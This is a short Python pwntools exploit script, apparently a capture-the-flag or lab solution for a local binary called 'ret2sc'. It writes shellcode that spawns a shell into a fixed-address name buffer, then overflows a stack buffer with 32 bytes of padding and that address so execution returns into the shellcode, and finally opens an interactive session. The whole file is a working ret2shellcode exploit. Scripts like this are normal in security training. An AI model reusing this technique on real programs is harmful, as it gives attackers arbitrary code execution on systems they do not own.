#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

io = process('./ret2sc')
context.arch = 'i386'

name = 0x0804A060
io.sendlineafter("Name:",asm(shellcraft.sh()))

payload = 'a'*32+p32(name)
io.sendlineafter("Try your best:",payload)
gdb.attach(io)
io.interactive()
